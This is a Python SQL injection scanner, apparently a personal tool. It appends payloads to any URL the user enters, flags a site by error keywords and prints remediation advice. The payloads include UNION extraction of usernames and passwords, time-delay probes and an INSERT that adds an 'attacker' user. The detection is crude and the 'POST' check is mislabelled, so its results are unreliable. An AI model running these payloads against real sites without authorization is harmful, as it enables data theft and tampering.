import requests
import pyfiglet
from termcolor import colored
from colorama import init
from colorama import Fore
import signal
import sys

# تهيئة colorama للعمل بشكل صحيح على جميع الأنظمة
init(autoreset=True)

# منع الإغلاق عند الضغط على Ctrl+C
def signal_handler(sig, frame):
    print(Fore.RED + "\nYou tried to exit the tool. Please use the proper exit procedure.")
    return

# تعيين معالج الإشارة
signal.signal(signal.SIGINT, signal_handler)

def test_payloads(url, payloads):
    """
    اختبر مجموعة من الـ payloads المختلفة.
    :param url: الـ URL الهدف.
    :param payloads: قائمة من الـ payloads.
    :return: True إذا كان الموقع عرضة لثغرة SQL Injection.
    """
    for payload in payloads:
        # قم بإجراء الفحص باستخدام الـ payload في الرابط
        try:
            response = requests.get(url + payload, timeout=5)

            # فحص محتوى الاستجابة للكلمات المفتاحية التي قد تشير إلى وجود ثغرة
            if any(error in response.text.lower() for error in [
                "syntax error", "mysql", "sql", "warning", "unclosed", "unexpected", "error", "you have an error", "fatal", "query"
            ]):
                print(Fore.YELLOW + f"Potential vulnerability found with payload: {payload}")
                return True
        except requests.RequestException as e:
            print(Fore.RED + f"Error making request: {e}")
            continue
    return False

def generate_security_report():
    """
    يولد تقريرًا حول كيفية تأمين الموقع ضد SQL Injection.
    :return: نص التقرير.
    """
    report = """
    SQL Injection Vulnerability Found! Here's how to secure the website:

    1. **Use Prepared Statements**: 
       - Always use prepared statements (also known as parameterized queries) to avoid SQL injection.
       - Example in Python (using SQLite):
         cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
       
    2. **Input Validation**:
       - Properly validate and sanitize user input. Reject dangerous characters like quotes (') and semicolons (;).
       - Consider using a whitelist for allowed characters and inputs.
       
    3. **Use Stored Procedures**:
       - Whenever possible, use stored procedures as they can be safer than dynamic SQL.
       
    4. **Limit Database Permissions**:
       - Use the principle of least privilege: limit the database permissions for the web application account to only what's necessary.
       - Ensure the account doesn't have administrative or delete privileges.
       
    5. **Error Handling**:
       - Do not expose database error messages to the users. Use generic error messages like "Invalid input" instead of detailed error information.
       - Log errors for internal review but avoid exposing sensitive information.
       
    6. **Use Web Application Firewalls (WAFs)**:
       - A WAF can help detect and block malicious SQL injection attacks in real-time.
       
    7. **Regular Security Testing**:
       - Regularly test your website for vulnerabilities using automated tools and manual penetration testing.
       - Keep your software and libraries up-to-date to avoid known vulnerabilities.

    8. **Use a Web Security Scanner**:
       - Use tools like SQLmap, Burp Suite, or OWASP ZAP to scan for SQL injection vulnerabilities in your application.
       
    Follow these guidelines to secure your site from SQL injection attacks!
    """
    return report

def is_vulnerable(url):
    """
    يتحقق إذا كان الرابط عرضة لثغرة SQL Injection باستخدام مجموعة متنوعة من الـ payloads.
    :param url: الرابط المراد فحصه.
    :return: True إذا كان عرضة للثغرة.
    """
    # مجموعة من الـ payloads التي يتم اختبارها
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' OR 1=1/*",
        "' AND 1=1 --",
        "' OR 'a'='a",
        "' AND 'x'='x",
        "' UNION SELECT NULL, NULL, NULL --",
        "' UNION SELECT NULL, username, password FROM users --",
        "' UNION SELECT null, null, null, version() --",
        "'; SLEEP(5) --",
        "'; WAITFOR DELAY '00:00:05' --",
        "' AND EXTRACTVALUE(1, CONCAT(0x3a, database())) --",
        "' AND 1=CONVERT(INT, (SELECT @@version)) --",
        "' OR 1=1 --",
        "' OR 1=1 /*",
        "'; INSERT INTO users (username, password) VALUES ('attacker', 'password') --"
    ]
    
    # فحص GET Method
    if test_payloads(url, payloads):
        return True
    
    # فحص POST Method (إذا كان الرابط لا يعمل باستخدام GET)
    if test_payloads(url + '?id=1', payloads):  # تعديل الرابط للـ POST إذا لزم الأمر
        return True
    
    return False

# عرض اسم الأداة بأسلوب ASCII Art باستخدام pyfiglet في بداية السكربت
ascii_art_tool_name = pyfiglet.figlet_format("SQL Injection Test")

# طباعة اسم الأداة بالألوان الطيفية (قوس قزح)
print(Fore.CYAN + ascii_art_tool_name)

# طباعة اسم الصانع كنص عادي أسفل الأداة مع تلوينه
print(Fore.MAGENTA + "By Abdelrhman Nada")

# طباعة رسالة ترحيب بالألوان المتعددة
print(Fore.GREEN + "Welcome to the SQL Injection Tester!")

# حلقة تكرار بحيث تبقى الأداة مفتوحة
while True:
    # إدخال الرابط من قبل المستخدم
    url = input(Fore.BLUE + "Enter the URL to check for SQL injection (or type 'exit' to quit): ")

    # الخروج من الأداة إذا كتب المستخدم "exit"
    if url.lower() == 'exit':
        print(Fore.RED + "Exiting the tool. Goodbye!")
        break

    # اختبار الثغرة
    if is_vulnerable(url):
        print(Fore.RED + f"The URL {url} is vulnerable to SQL injection.")
        print(Fore.YELLOW + "\nSecurity Recommendations:\n")
        print(Fore.CYAN + generate_security_report())
    else:
        print(Fore.GREEN + f"The URL {url} is not vulnerable to SQL injection.")